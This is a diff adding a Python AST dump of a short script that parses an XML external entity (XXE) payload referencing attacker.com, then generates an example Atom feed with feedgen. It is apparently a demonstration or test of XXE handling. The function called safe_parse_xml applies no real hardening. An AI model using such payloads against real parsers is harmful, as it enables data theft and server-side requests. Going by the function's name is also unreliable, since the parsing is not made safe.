@@ -1,0 +1,236 @@
+Module(
+    body=[
+        ImportFrom(
+            module='feedgen.feed',
+            names=[
+                alias(name='FeedGenerator')],
+            level=0),
+        Import(
+            names=[
+                alias(name='xml.etree.ElementTree', asname='ET')]),
+        Import(
+            names=[
+                alias(name='io')]),
+        Assign(
+            targets=[
+                Name(id='malicious_xml', ctx=Store())],
+            value=Constant(value='<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://attacker.com/malicious">\n]>\n<feed>\n  <entry>\n    <title>Example Entry</title>\n    <content>&xxe;</content>\n  </entry>\n</feed>\n')),
+        FunctionDef(
+            name='safe_parse_xml',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='xml_string')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Try(
+                    body=[
+                        Assign(
+                            targets=[
+                                Name(id='tree', ctx=Store())],
+                            value=Call(
+                                func=Attribute(
+                                    value=Name(id='ET', ctx=Load()),
+                                    attr='parse',
+                                    ctx=Load()),
+                                args=[
+                                    Call(
+                                        func=Attribute(
+                                            value=Name(id='io', ctx=Load()),
+                                            attr='StringIO',
+                                            ctx=Load()),
+                                        args=[
+                                            Name(id='xml_string', ctx=Load())],
+                                        keywords=[])],
+                                keywords=[])),
+                        Return(
+                            value=Name(id='tree', ctx=Load()))],
+                    handlers=[
+                        ExceptHandler(
+                            type=Attribute(
+                                value=Name(id='ET', ctx=Load()),
+                                attr='ParseError',
+                                ctx=Load()),
+                            name='e',
+                            body=[
+                                Expr(
+                                    value=Call(
+                                        func=Name(id='print', ctx=Load()),
+                                        args=[
+                                            Constant(value='ParseError:'),
+                                            Name(id='e', ctx=Load())],
+                                        keywords=[]))]),
+                        ExceptHandler(
+                            type=Name(id='Exception', ctx=Load()),
+                            name='e',
+                            body=[
+                                Expr(
+                                    value=Call(
+                                        func=Name(id='print', ctx=Load()),
+                                        args=[
+                                            Constant(value='An error occurred:'),
+                                            Name(id='e', ctx=Load())],
+                                        keywords=[]))])],
+                    orelse=[],
+                    finalbody=[])],
+            decorator_list=[]),
+        FunctionDef(
+            name='main',
+            args=arguments(
+                posonlyargs=[],
+                args=[],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Expr(
+                    value=Call(
+                        func=Name(id='print', ctx=Load()),
+                        args=[
+                            Constant(value='Attempting to parse malicious XML...')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Name(id='safe_parse_xml', ctx=Load()),
+                        args=[
+                            Name(id='malicious_xml', ctx=Load())],
+                        keywords=[])),
+                Assign(
+                    targets=[
+                        Name(id='fg', ctx=Store())],
+                    value=Call(
+                        func=Name(id='FeedGenerator', ctx=Load()),
+                        args=[],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='fg', ctx=Load()),
+                            attr='id',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='http://example.com')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='fg', ctx=Load()),
+                            attr='title',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='Example Feed')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='fg', ctx=Load()),
+                            attr='link',
+                            ctx=Load()),
+                        args=[],
+                        keywords=[
+                            keyword(
+                                arg='href',
+                                value=Constant(value='http://example.com')),
+                            keyword(
+                                arg='rel',
+                                value=Constant(value='self'))])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='fg', ctx=Load()),
+                            attr='description',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='This is an example feed.')],
+                        keywords=[])),
+                Assign(
+                    targets=[
+                        Name(id='entry', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='fg', ctx=Load()),
+                            attr='add_entry',
+                            ctx=Load()),
+                        args=[],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='entry', ctx=Load()),
+                            attr='id',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='http://example.com/item1')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='entry', ctx=Load()),
+                            attr='title',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='Item 1')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='entry', ctx=Load()),
+                            attr='link',
+                            ctx=Load()),
+                        args=[],
+                        keywords=[
+                            keyword(
+                                arg='href',
+                                value=Constant(value='http://example.com/item1'))])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='entry', ctx=Load()),
+                            attr='description',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='This is the first item.')],
+                        keywords=[])),
+                Assign(
+                    targets=[
+                        Name(id='feed_xml', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='fg', ctx=Load()),
+                            attr='atom_str',
+                            ctx=Load()),
+                        args=[],
+                        keywords=[
+                            keyword(
+                                arg='pretty',
+                                value=Constant(value=True))])),
+                Expr(
+                    value=Call(
+                        func=Name(id='print', ctx=Load()),
+                        args=[
+                            Constant(value='Generated Feed XML:')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Name(id='print', ctx=Load()),
+                        args=[
+                            Name(id='feed_xml', ctx=Load())],
+                        keywords=[]))],
+            decorator_list=[]),
+        If(
+            test=Compare(
+                left=Name(id='__name__', ctx=Load()),
+                ops=[
+                    Eq()],
+                comparators=[
+                    Constant(value='__main__')]),
+            body=[
+                Expr(
+                    value=Call(
+                        func=Name(id='main', ctx=Load()),
+                        args=[],
+                        keywords=[]))],
+            orelse=[])],
+    type_ignores=[])
